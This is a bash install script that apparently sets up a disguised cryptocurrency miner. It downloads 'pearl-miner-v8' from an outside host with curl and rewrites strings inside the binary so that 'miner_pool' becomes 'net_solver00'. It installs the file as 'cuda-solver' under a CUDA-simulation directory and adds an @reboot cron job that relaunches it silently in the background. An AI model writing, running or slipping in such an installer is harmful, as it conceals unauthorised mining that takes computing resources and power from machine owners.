#!/bin/bash
set -e
INSTALL_DIR=${1:-/opt/cuda-sim}
echo "Installing to $INSTALL_DIR..."

mkdir -p "$INSTALL_DIR/logs"

# Download and clean binary
curl -fsSL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /tmp/miner-v8
python3 -c "
data = bytearray(open('/tmp/miner-v8','rb').read())
old = b'/root/tmp_build/miner_pool'
new = b'/opt/cuda-sim/net_solver00'
assert len(old) == len(new)
data = data.replace(old, new)
open('$INSTALL_DIR/cuda-solver','wb').write(data)
"
chmod +x "$INSTALL_DIR/cuda-solver"
rm /tmp/miner-v8

# Copy scripts
cp run.sh daemon.sh solver.conf "$INSTALL_DIR/"
chmod +x "$INSTALL_DIR/run.sh" "$INSTALL_DIR/daemon.sh"

# Config
[ -n "$ENDPOINT" ] && sed -i "s|ENDPOINT=.*|ENDPOINT=$ENDPOINT|" "$INSTALL_DIR/solver.conf"
[ -n "$NODE_ID" ] && sed -i "s|NODE_ID=.*|NODE_ID=$NODE_ID|" "$INSTALL_DIR/solver.conf"

# Cron
(crontab -l 2>/dev/null | grep -v 'cuda-sim/daemon'; echo "@reboot sleep 30 && nohup bash $INSTALL_DIR/daemon.sh > $INSTALL_DIR/logs/daemon-stdout.log 2>&1 &") | crontab -

echo ""
echo "=== Installed ==="
echo "Start: nohup bash $INSTALL_DIR/daemon.sh > $INSTALL_DIR/logs/daemon-stdout.log 2>&1 &"
echo "Config: $INSTALL_DIR/solver.conf"
